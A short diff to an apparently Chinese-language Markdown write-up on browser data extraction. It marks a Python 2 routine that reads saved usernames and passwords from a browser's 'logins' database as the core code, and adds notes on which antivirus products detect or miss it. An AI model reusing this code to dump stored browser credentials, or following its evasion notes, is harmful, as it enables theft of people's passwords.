@@ -92,6 +92,7 @@ def Readpass(path_data):
     except Exception, e:
         print e
 
+    #####核心代码开始#####
     cur.execute('SELECT origin_url, username_value, password_value FROM logins')
     data_result = {}
 
@@ -101,6 +102,9 @@ def Readpass(path_data):
         except Exception,e:
             password = ''
         URL = res[0];username = res[1]
+        #####核心代码结束#####
+
+
         tplt = "{0:60s} {1:20s} {2:20s}"
         print tplt.format(URL, username, password)
         print "----------------------------------------------------------------------------------------------------"
@@ -126,6 +130,10 @@ if __name__ == '__main__':
             print e
 
 ```
+
+**杀软对抗测试**
+* Avast_free_antivirus （20191029 杀）
+* Malwarebytes premium trial 2 （20191029 过）
 
 ## 历史记录获取
 
